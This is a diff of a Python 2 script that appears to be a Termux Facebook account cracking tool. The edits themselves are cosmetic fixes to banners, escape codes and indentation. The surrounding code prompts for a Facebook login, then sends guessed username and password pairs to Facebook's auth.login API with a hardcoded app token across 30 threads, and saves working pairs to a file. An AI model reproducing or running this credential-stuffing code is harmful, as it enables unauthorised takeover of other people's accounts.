@@ -10716,7 +10716,7 @@ def login1():
 		jalan(' \033[1;97mWarning  \033[1;97mTermux All Version Work ' )                 
 		print "\033[1;97m«-----------------\033[1;97mRdx\033[1;97m-----------------»"
 		print('\033[1;97m\x1b[1;92m..............LOGIN WITH FACEBOOK.............\x1b[1;97m' )
-		print('	' )
+		print('ⓇDX-OK/CP' )
 		id = raw_input('\033[1;97m[] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;93m')
 		pwd = raw_input('\033[1;97m[] \x1b[1;91mPassword      \x1b[1;91m: \x1b[1;92m')
 		tik()
@@ -13460,7 +13460,7 @@ def pilih_army():
 ✤ •*`*•.¸¸.•*`*•.¸¸✽✤ •*`*•.¸¸.•*`*•.¸¸✽
 
                                                                                                                                                       
-             ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄  ▄       ▄                                                                                                   
+  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄  ▄       ▄                                                                                                   
 ▐░░░░░░░░░░░▌▐░░░░░░░░░░▌▐░▌     ▐░▌                                                                                                  
 ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌   ▐░▌                                                                                                   
 ▐░▌       ▐░▌▐░▌       ▐░▌ ▐░▌ ▐░▌                                                                                                    
@@ -14572,7 +14572,7 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m[ⓇDX-OK]x1b[0m ' + k + c + user + ' -•◈•- ' + pass1+'\n'+"\n"
+				print '\x1b[1;92m[ⓇDX-OK]\x1b[0m ' + k + c + user + ' -•◈•- ' + pass1+'\n'+"\n"
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'-•◈•-'+pass1+'\n')
 				okb.close()
@@ -14602,8 +14602,8 @@ def action():
 #					        cps.close()
 #					        cpb.append(c+user+pass2)
 																	
-							 
-		 except:
+															
+		except:
 			pass
 		
 	p = ThreadPool(30)
